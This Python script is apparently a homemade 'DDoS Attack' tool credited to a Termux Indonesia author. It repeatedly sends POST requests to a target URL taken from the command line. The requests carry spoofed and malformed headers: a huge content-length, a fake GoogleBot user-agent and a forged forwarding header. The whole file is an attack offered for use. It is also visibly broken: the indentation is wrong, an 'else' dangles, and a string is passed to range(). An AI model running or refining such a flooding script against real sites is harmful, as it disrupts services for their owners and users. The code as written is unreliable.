import requests
import sys
import os

url = sys.argv[1]
h = {
  "content-length" : "1000000000000000000",
  "connection" : "close",
  "user-agent" : "GoogleBot V3",
  "x-forwarded-from" : "0.0.0.0",
  "content-type" : "application/xml",
  "set-cookie" : "v=xxxxXxxxxxx;&vx=#xxxxxxxxxxxxxxxx0x;;d;"
  }

data = {
  "X" : "xXxxX",
  "Y" : "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
  }

os.system("clear")
os.system("figlet Termuxid DDos Attack")
print("""
Author   : Rio Agung Purnomo
TEAM     : Termux Indonesia
Thanks   : All Member Termux Indonesia
Tingkat  : Programmer & Developer
https://termuxid.dev
""")

if sys.argv[2] == False:
    amount = 100
    else:
        amount = sys.argv[2]

os.system("clear")
os.system("figlet Attack Starting")
  for i in range(1,amount):
  r = requests.post(url,data=data,headers=h)
  print("Send {}, respon {}".format(i,r.status_code))